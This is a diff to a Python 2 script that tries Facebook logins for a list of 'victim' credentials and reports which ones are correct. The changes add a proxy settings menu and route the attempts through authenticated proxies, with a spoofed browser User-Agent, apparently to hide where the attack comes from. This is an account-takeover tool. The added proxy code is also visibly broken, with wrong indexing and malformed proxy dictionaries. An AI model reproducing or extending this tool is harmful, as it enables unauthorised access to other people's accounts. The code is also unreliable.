@@ -31,7 +31,9 @@ while retry=='y':
 	print ''
 	print '	(1) Manual Insertion'
 	print '	(2) Import files'
+	print '	(3) Settings'
 	print ''
+	proxy = [] #host-user-password-port
 	tp = int(raw_input('Type > '))
 
 	#Different paths
@@ -61,6 +63,15 @@ while retry=='y':
 		# User-Agent (this is cheating, ok?)
 		br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 		#"Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13")]
+		if len(proxy)>1:
+			br.set_proxies({"http: "+proxy[1]+":"+proxy[2]+"@"+proxy[0]+":"+port[3],"ftp: "+proxy[0]})
+			# Add HTTP Basic/Digest auth username and password for HTTP proxy access.
+			# (equivalent to using "joe:password@..." form above)
+			br.add_proxy_password(proxy[1], proxy[2])
+		if len(proxy)==2:
+			br.set_proxies(proxy[0]+":"+port[3])
+			# Add HTTP Basic/Digest auth username and password for HTTP proxy access.
+			# (equivalent to using "joe:password@..." form above)
 		#Login
 		br.open('http://m.facebook.com/')
 		intitle = br.title()
@@ -157,6 +168,16 @@ while retry=='y':
         # User-Agent (this is cheating, ok?)
 		br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 		#"Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13")]
+		#PROXY
+		if len(proxy)>1:
+			br.set_proxies({"http"+": "+proxy[1]+":"+proxy[2]+"@"+proxy[0]+":"+port[3],"ftp: "+proxy[0]})
+			# Add HTTP Basic/Digest auth username and password for HTTP proxy access.
+			# (equivalent to using "joe:password@..." form above)
+			br.add_proxy_password(proxy[1], proxy[2])
+		if len(proxy)==2:
+			br.set_proxies({"http"+": "+proxy[0]+":"+port[3],"ftp: "+proxy[0]})
+			# Add HTTP Basic/Digest auth username and password for HTTP proxy access.
+			# (equivalent to using "joe:password@..." form above)
 		#Login
 		for i in range(0,victim.__len__()-1):
                         br.open('http://m.facebook.com/')
@@ -186,6 +207,29 @@ while retry=='y':
                         #        print (victim[i]+' : '+'CHECK RESPONSE: CORRECT LOGIN ')
                         #if outurl!='https://m.facebook.com/checkpoint/?refid=8&_rdr' and outurl!='https://m.facebook.com/login/save-device/?login_source=login&refsrc=https%3A%2F%2Fm.facebook.com%2F&refid=8&_rdr#_=_':
                         #        print (victim[i]+' : '+'CHECK RESPONSE: BAD LOGIN')
+	if tp==3:
+		print '[1] Set Proxy'
+		ch = raw_input('>> ')
+		if ch=='1':
+			host = raw_input('Host [e.g. myproxy.com] : ')
+			proxy.append(host)
+			user = raw_input(' User [Insert 0 to skip] : ')
+			if user=='0':
+				del(user)
+			else:
+				proxy.append(user)
+			print 'Passord will be obscured'
+			password = getpass.getpass('Password [Insert 0 to skip] : ').decode('unicode_escape')
+			if password=='0':
+				del(password)
+			else:
+				proxy.append(password)
+			port = raw_input('Port [Insert 0 to skip] : ')
+			if port=='0':
+				del(port)
+			else:
+				proxy.append(port)
+			continue
 	retry = raw_input('Retry? (y/n) : ')
 
 	#except Exception:
